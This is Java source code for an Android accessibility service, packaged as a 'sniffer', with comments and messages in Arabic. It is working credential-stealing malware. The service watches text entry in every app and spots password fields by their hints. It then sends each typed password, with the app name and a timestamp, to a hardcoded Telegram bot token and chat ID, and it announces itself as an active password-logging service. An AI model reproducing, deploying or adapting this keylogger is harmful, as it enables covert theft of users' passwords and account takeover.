package com.v8.global.sniffer;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import java.util.List;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder keyLogBuffer = new StringBuilder();
    private boolean isKeyLogging = true;
    private String currentApp = "";
    private OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .build();
    
    @Override
    public void onCreate() {
        super.onCreate();
        setupService();
        sendTelegram("🔐 **خدمة تسجيل كلمات المرور نشطة**");
    }
    
    private void setupService() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
                         
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS |
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
                    
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
                currentApp = packageName;
                break;
                
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChanged(event);
                break;
        }
    }
    
    private void handleTextChanged(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String text = getNodeText(source);
            String hint = getNodeHint(source);
            String className = source.getClassName() != null ? source.getClassName().toString() : "";
            
            // كشف حقول كلمات المرور
            if (className.contains("Password") || 
                (hint != null && (hint.toLowerCase().contains("password") || 
                 hint.toLowerCase().contains("كلمة المرور") ||
                 hint.toLowerCase().contains("كلمة السر") ||
                 hint.toLowerCase().contains("رمز")))) {
                
                if (!TextUtils.isEmpty(text) && text.length() > 2) {
                    String passInfo = "🔑 **كلمة مرور مدخلة**\n\n" +
                                     "**التطبيق:** " + currentApp + "\n" +
                                     "**الحقل:** " + (hint != null ? hint : "غير معروف") + "\n" +
                                     "**القيمة:** `" + text + "`\n" +
                                     "⏰ " + new java.util.Date().toString();
                    
                    sendTelegram(passInfo);
                }
            }
            
            source.recycle();
        }
    }
    
    private String getNodeText(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence text = node.getText();
        return text != null ? text.toString() : "";
    }
    
    private String getNodeHint(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence hint = node.getHintText();
        return hint != null ? hint.toString() : "";
    }
    
    @Override
    public void onInterrupt() {}
    
    private void sendTelegram(String message) {
        try {
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + 
                         "&text=" + java.net.URLEncoder.encode(message, "UTF-8") + 
                         "&parse_mode=Markdown";
            
            Request request = new Request.Builder()
                    .url(url)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call c, IOException e) {}
                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }
}
